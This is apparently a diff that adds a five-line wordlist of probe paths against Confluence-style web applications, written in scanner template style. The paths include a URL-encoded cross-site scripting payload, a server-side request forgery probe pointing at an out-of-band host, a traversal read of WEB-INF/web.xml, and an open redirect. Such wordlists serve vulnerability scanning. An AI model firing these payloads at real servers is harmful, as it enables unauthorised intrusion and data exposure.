@@ -1,0 +1,5 @@
+/spaces/viewdefaultdecorator.action?decoratorName
+/pages/includes/status-list-mo%3Ciframe%20src%3D%22javascript%3Aalert%28document.domain%29%22%3E.vm
+/rest/sharelinks/1.0/link?url=https://{{interactsh-url}}/
+/s/{{randstr}}/_/;/WEB-INF/web.xml
+/ThisCanBeAnything?os_destination=%2F%2Foast.pro
